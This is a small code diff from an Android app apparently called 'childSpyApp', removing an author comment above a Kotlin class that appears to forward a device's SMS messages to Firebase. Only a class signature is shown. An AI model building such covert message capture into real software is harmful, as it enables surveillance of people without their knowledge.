@@ -9,9 +9,7 @@ import sammy.mutahi.gicheru.childSpyApp.utils.Consts.DATA
 import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS
 import javax.inject.Inject
 
-/**
- * Created by luis rafael on 27/03/18.
- */
+
 class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {
 
     override fun setPushSms(smsAddress: String, smsBody: String) {
